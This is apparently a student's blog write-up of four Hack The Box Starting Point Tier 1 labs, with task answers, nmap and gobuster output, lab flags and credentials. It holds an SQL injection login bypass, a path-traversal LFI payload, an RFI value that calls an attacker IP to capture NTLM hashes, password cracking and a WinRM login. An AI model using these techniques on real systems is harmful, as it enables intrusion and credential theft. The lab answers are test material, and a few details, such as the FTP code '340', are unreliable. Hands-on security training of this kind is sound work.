---
title: 'HTB Starting Point - Tier 1'
description: 'Hack the Box Starting Point'
pubDate: 'Nov 26 2024'
heroImage: '/blog-placeholder-2.jpg'
---

Topics covered:  
* SQLi
* Server side template injection
* Remote file inclusion
* Web/reverse shells
* Navigating Jenkins
* S3

---

## Appointment  
*Apache, MariaDB, PHP, SQL, SQLi*

**Task 1**  
What does the acronym SQL stand for?  
Structured Query Language


**Task 2**  
What is one of the most common type of SQL vulnerabilities?  
SQL Injection


**Task 3**  
What is the 2021 OWASP Top 10 classification for this vulnerability?  
A03:2021-Injection 


**Task 4**  
What does Nmap report as the service and version that are running on port 80 of the target?

```bash
nmap -sV $TARGET

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```


**Task 5**  
What is the standard port used for the HTTPS protocol?  
443


**Task 6**  
What is a folder called in web-application terminology?  
Directory


**Task 7**  
What is the HTTP response code is given for 'Not Found' errors?  
404


**Task 8**  
Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?  

```bash
gobuster dir
```


**Task 9**  
What single character can be used to comment out the rest of a line in MySQL?  
`#`


**Task 10**  
If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?  
Login: `admin' #`

Webpage says "Congratulations! Your flag is: <flag>"


**Task 11**  
Submit root flag  
`e3d0796d002a446c0e622226f42e9672`

---

## Sequel
*MySQL, SQL, Weak credentials*

**Task 1**  
During our scan, which port do we find serving MySQL?  
```bash
kali$ nmap -sV $TARGET

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

kali$ nmap -A $TARGET -p3006

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 96
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, InteractiveClient, SupportsCompression, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: Rz2(p{<V{-f>Ainn^j{M
|_  Auth Plugin Name: mysql_native_password
```


**Task 2**  
What community-developed MySQL version is the target running?  
MariaDB


**Task 3**  
When using the MySQL command line client, what switch do we need to use in order to specify a login username?  
`mysql -us <name>`


**Task 4**  
Which username allows us to log into this MariaDB instance without providing a password?  
`root`


**Task 5**  
In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?  
`*`


**Task 6**
In SQL, what symbol do we need to end each query with?  
`;`


**Task 7**
There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
```bash
kali$ mysql -u root -h $TARGET --skip-ssl

MariaDB> SHOW DATABASES
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.388 sec)
```

Answer: `htb`

This means that `information_schema`, `mysql` and `performance_schema` are found on every instance of MySQL

**Task 8**  
Submit root flag  

```sql
MariaDB> use htb

MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.305 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <flag>                           |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.336 sec)
```

---

## Crocodile
*Apache, FTP, Website Structure Discovery*

**Task 1**  
What Nmap scanning switch employs the use of default scripts during a scan?  
`-sC`


**Task 2**  
What service version is found to be running on port 21?  
```bash
$ nmap -sC $TARGET

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http
|_http-title: Smash - Bootstrap Business Template

Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
```

`vsFTPd 3.0.3`


**Task 3**  
What FTP code is returned to us for the "Anonymous FTP login allowed" message?  
`340` (see task 2)


**Task 4**  
After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?  
`anonymous`


**Task 5**  
After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?  
```bash
kali$ ftp anonymous@$TARGET

ftp> ls
ftp> get <file>
```

Answer: `get`


**Task 6**  
What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?  
`admin`


**Task 7**  
What version of Apache HTTP Server is running on the target host?  
```
nmap -sV --version-all -p80 $TARGET

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```


**Task 8**  
What switch can we use with Gobuster to specify we are looking for specific filetypes?  
`gobuster dir -x`


**Task 9**  
Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?  
```bash
kali$ gobuster dir -x php -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.68.207
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/git/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.68.207/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 312] [--> http://10.129.68.207/css/]
/dashboard            (Status: 301) [Size: 318] [--> http://10.129.68.207/dashboard/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.68.207/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 311] [--> http://10.129.68.207/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 278]
Progress: 8173 / 9472 (86.29%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8173 / 9472 (86.29%)
===============================================================
Finished
===============================================================
```


**Task 10**  
Submit root flag  

From connecting to the ftp server earlier, we got the user list and their passwords:
```bash
kali$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

kali$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Logging in as admin takes you to the dashboard with the flag

---

## Responder 
*XAMPP, SMB, PHP, Remote File Inclusion, Remote Code Execution*

**Task 1**  
When visiting the web service using the IP address, what is the domain that we are being redirected to?  
`unika.htb`

*N.b. should have done a port scan as first action!*


**Task 2**  
Which scripting language is being used on the server to generate webpages?  
PHP. (Examine the index page redirecting to the domain)

> **Learning opportunity**
>
> I was unable to view any site content - the dns kept erroring out. If I had done an nmap scan at the start, I would have known that the web service was on port 80 (beyond simply assuming it was and seeing the server perform a redirect). 
>
> Looking at the official writeup, it went on to explain the server was using name-based virtual hosting. This is where multiple multiple domains can be hosted on the same machine and each domain is able to handle their request separately. I've come across this concept before with services like `Coolify` though didn't know how it worked or what is was called. It allows one server to share the resources for multiple hostnames. The web server knows which service to hand the request to based on the domain name found in the `Host` HTTP header. 
>
> The fix for me is to manually add it to my `/etc/hosts` file


**Task 3**  
What is the name of the URL parameter which is used to load different language versions of the webpage?  
`page=german.html`


**Task 4**  
Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"  
`../../../../../../../../windows/system32/drivers/etc/hosts`

This exploit works on the unika.htb site. I assume this is working because php server is using the contents of `page=<file>` to populate the contents of the page. Thus by providing a different file, we see different content.

> **Learning Opportunity**
>
> Reading the HTB writeup, this exploit is possible due to the use of PHP's `include()` function combined with a lack of sanitisation. In this way, we can expose a file not intended to be displayed on the website.
>
> The `include()` function in PHP loads a specific file into memory and makes the contents available for use. e.g. IT can be used to read a file, or load php variables


**Task 5**  
Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"  
`//10.10.14.6/somefile`


**Task 6**  
What does NTLM stand for?  
`New Technology LAN Manager`


**Task 7**  
Which flag do we use in the Responder utility to specify the network interface?  
`responder -I`

> **Learning Opportunity** 
>
> Responder is a tool that can gather hashed credentials used in NTLM and facilitate relay attacks. It targets the protocols Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS) and Multicast DNS (MDNS).


**Task 8**  
There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?  
`John The Ripper`


**Task 9**  
What is the password for the administrator user?  

Potential approaches to this task:
* Local file inclusion to expose /etc/shadow file to identify admin user
* `responder` tool to capture NTLM hash and trigger a page load...?

I had to refer to the writeup as my knowledge was not there. See below (after the tasks) for notes of my learning.

```bash
john admin-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2

badminton        (Administrator)
```


**Task 10**  
We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?  

```bash
nmap -sV $TARGET -p1-10000 --min-rate=5000

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port: `5985`


**Task 11**  
Submit root flag  

```bash
kali$ evil-winrm -i $TARGET -u Administrator -p badminton

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator
*Evil-WinRM* PS C:\Users\> cat mike/Desktop/flag.txt
<flag>
```

### Harvesting NTLM Credentials 
**Responder Challenge Capture - Utilising `Responder`, `SMB` and Remote File Inclusion**  

To summarise this challenge, we first exploit a PHP app that is unsafely using the `include()` function. We then attempt to utilise remote file inclusion to capture some NTLM credentials. We do this by triggering an SMB request back to our host machine. We capture the credentials by using `Responder` which is listening for SMB connections.

#### The NTLM Protocol 

#### Responder 

#### The Exploit
